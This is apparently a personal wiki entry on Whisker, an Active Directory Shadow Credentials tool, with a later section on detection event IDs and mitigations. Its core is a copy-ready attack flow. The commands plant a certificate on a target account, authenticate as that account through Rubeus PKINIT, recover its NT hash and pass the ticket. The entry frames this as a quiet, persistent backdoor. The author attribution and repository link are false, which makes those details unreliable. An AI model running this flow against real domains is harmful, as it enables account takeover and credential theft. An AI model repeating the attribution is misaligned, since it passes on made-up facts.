---
title: Whisker
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, windows, shadow-credentials, ly4k, kerberos, pki]
---

# Whisker

**Whisker** (by [[ly4k]] / thehackersbrain, C#) is the **Shadow Credentials**
tool: it plants, lists, and removes attacker-controlled **X.509 certificates**
on a target account's `msDS-KeyCredentialLink` attribute, enabling
**passwordless takeover** of that account via PKINIT and **NT hash recovery**
([[shadow-credentials]]). You need **GenericWrite** on the target account
([[acl-abuse]]) to plant a credential. It pairs with [[rubeus]] `asktgt
/certificate:` for the actual auth.

## Subcommands

- `add /target:<account>` — generate a cert + key and write it to the
  account's `msDS-KeyCredentialLink` (the plant).
- `list /target:<account>` — show the key credential links (find an existing
  / honey one).
- `remove /target:<account> /deviceid:<id>` — remove a planted credential
  (cleanup, or remove someone else's).
- `get /target:<account>` — retrieve credential details.

## The flow (with Rubeus)

```powershell
# 1. Plant a shadow credential on the target (need GenericWrite on it)
Whisker.exe add /target:IntermediateUser
#    -> prints a base64 PFX (the cert+key) you now control

# 2. Auth as the target via PKINIT (Rubeus) — also recovers the NT hash
Rubeus.exe asktgt /user:IntermediateUser /certificate:<base64-pfx> /password:"<pfxpass>" /domain:corp.local /dc:dc01.corp.local /getcredentials /ptt

# 3. Confirm + use the identity
Rubeus.exe triage
whoami /all

# Cleanup (remove your planted cred)
Whisker.exe remove /target:IntermediateUser /deviceid:<id>
```

## Why shadow creds over a password reset

- **No lockout / no reset event** — planting a cert doesn't reset the
  password, so the real user keeps working (quieter).
- **Recovers the NT hash** — the PKINIT `asktgt` returns
  `PAC_CREDENTIAL_INFO` with the target's NT hash ([[pkinit-unpac-the-hash]]),
  useful for other tooling.
- **Standing backdoor** — the planted cred persists (until removed), so it's
  also a [[ad-persistence]] primitive.

## Detection

- **5136** — a write to `msDS-KeyCredentialLink` on a user object (the
  high-fidelity plant tell).
- **4768 PKINIT** — a TGT request using a *certificate* for a normal user from
  a workstation (a new cert authenticating).
- **4769** for service SPNs after the cert auth (lateral movement).
- A `msDS-KeyCredentialLink` entry pointing at an unexpected issuer/CN.

## Mitigations

- **Least privilege on `msDS-KeyCredentialLink`** — few accounts should have
  write access to it; audit with [[bloodhound]] / `Get-DomainObjectAcl`.
- **Alert on** 5136 writes to the attribute and on PKINIT 4768 from
  non-CA clients.
- **Limit key trust** — restrict which accounts can hold key credentials
  ([[ad-tiering-and-hardening]]).

## Links

- [[shadow-credentials]] — the technique this tool implements
- [[pkinit-unpac-the-hash]] — the NT-hash recovery the PKINIT auth yields
- [[acl-abuse]] — the GenericWrite-on-account prerequisite
- [[rubeus]] — the `asktgt /certificate:` auth half
- [[kerberos-authentication]] — PKINIT is the AS-REQ path
- [[ad-persistence]] — the planted cred as a standing backdoor
- [[ly4k]] — the author (thehackersbrain)

## References

- [Whisker (ly4k)](https://github.com/ly4k/Whisker)
- [hideandsec.sh: Shadow Credentials](https://hideandsec.sh/2021-05-27-kerberos-shadow-credentials.html)
- [SpecterOps: Shadow Credentials](https://posts.specterops.io/)
